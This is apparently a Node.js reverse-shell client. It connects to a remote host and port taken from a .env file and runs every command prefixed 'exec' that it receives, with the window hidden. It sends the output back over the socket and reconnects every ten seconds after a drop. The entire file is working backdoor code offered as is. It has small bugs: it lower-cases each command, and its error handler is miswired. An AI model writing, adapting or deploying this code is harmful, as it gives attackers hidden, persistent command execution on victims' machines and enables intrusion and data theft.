const net = require("net");

const util = require("util");
const exec = util.promisify(require("child_process").exec);
const process = require("process");

const shell = require("./shell");

require("dotenv").config({ path: __dirname + "./../config/.env" });

let path = process.cwd();

const PORT = process.env.PORT;
const HOST = process.env.HOST;

const client = new net.Socket();

function connect() {
	client.connect(PORT, HOST);
}

client.on("data", (data) => {
	const dataStr = data.toString().toLowerCase();
	if (dataStr.startsWith("exec") && dataStr.split(" ")[1] === "cd") {
		path = shell.changeDir(data, path);
	}

	async function execute(command) {
		await exec(
			command,
			{ cwd: path, windowsHide: true },
			(e, stdout, stderr) => {
				client.write(`${stdout}\n`);
			}
		);
	}
	if (dataStr.startsWith("exec")) execute(dataStr.replace("exec", ""));
});

client.on("close" || "error", () => {
	setTimeout(() => {
		connect();
	}, 10000);
});

client.connect(PORT, HOST);
